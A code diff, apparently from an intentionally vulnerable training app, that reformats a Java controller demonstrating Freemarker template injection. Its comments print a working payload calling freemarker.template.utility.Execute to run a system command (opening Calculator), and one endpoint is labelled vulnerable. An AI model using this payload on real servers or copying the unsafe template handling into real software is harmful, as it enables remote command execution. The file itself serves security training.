@@ -26,13 +26,14 @@ public class FreemarkerController {
     /**
      * 渲染文件用法
      * 如果有机会修改模版文件index.ftl，则插入payload后可执行命令
-     * <#assign ex="freemarker.template.utility.Execute"?new()>${ex("open -a Calculator.app")}
+     * <#assign ex="freemarker.template.utility.Execute"?new()>${ex("open -a
+     * Calculator.app")}
      */
     @ApiOperation("渲染文件")
     @GetMapping("1")
     public String freemarker1(Model model, String name) {
-        if (name==null || "".equals(name)) {
-            name="test.jpg";
+        if (name == null || "".equals(name)) {
+            name = "test.jpg";
         }
         Image image = new Image();
         image.setName(name);
@@ -43,7 +44,8 @@ public class FreemarkerController {
 
     /**
      * 存在漏洞，攻击者传入如下代码即可执行系统命令
-     * ?msg=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("open -a Calculator.app")}
+     * ?msg=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("open -a
+     * Calculator.app")}
      */
     @ApiOperation("存在漏洞")
     @ResponseBody
